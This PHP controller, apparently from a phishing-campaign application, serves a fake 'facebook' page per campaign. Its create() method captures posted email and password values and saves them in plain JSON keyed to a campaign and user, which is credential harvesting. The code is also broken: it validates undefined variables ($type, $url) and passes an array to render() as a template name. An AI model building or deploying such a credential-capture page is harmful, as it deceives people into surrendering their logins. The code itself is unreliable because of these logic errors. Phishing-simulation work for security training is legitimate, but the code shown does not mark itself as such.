<?php

namespace App\Controller;

use App\MoteurDeRendu;
use App\Repository\DataRepository;

class FacebookController
{
    private MoteurDeRendu $moteur;
    private DataRepository $repository;
    
    public function __construct()
    {
        $this->moteur = new MoteurDeRendu();
        $this->repository = new DataRepository();
    }
    public function AfficherFacebook()
    {
        echo $this->moteur->render('facebook');
    }

    public function AfficherFacebookCamp($id)
    {
        $id_camp = $id;
        $contenu = $this->moteur->render(['id_camp' => $id_camp]);
        echo $this->moteur->render('facebook', [
            'contenu' => $contenu]);
    }

    public function create() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $email = $_POST['email'];
            $password = $_POST['password'];
            $json = json_encode(["Mail" => $email, "Password" => $password]);
            $id_camp = $_POST['id_camp'];
            if (isset($_POST['id_user'])) {
                $id_user = $_POST['id_user'];
            } else {
                $id_user = null; // ou une valeur par défaut
            }

            // Validation des données
            if (empty($type) || empty($url)) {
                echo "Veuillez remplir tous les champs.";
                return;
            }

            // Enregistrement dans la base de données
            $this->repository->createData($json, $id_camp, $id_user);
            header('Location: /campaigns'); // Redirection après l'enregistrement
            exit;
        } else {
            $contenu = $this->moteur->render('campaigns/form');
        
            echo $this->moteur->render('indexView', [
                'contenu' => $contenu,
                'header' => $this->moteur->render('headerView'),
                'footer' => $this->moteur->render('footerView')
            ]);
        }
    }
}

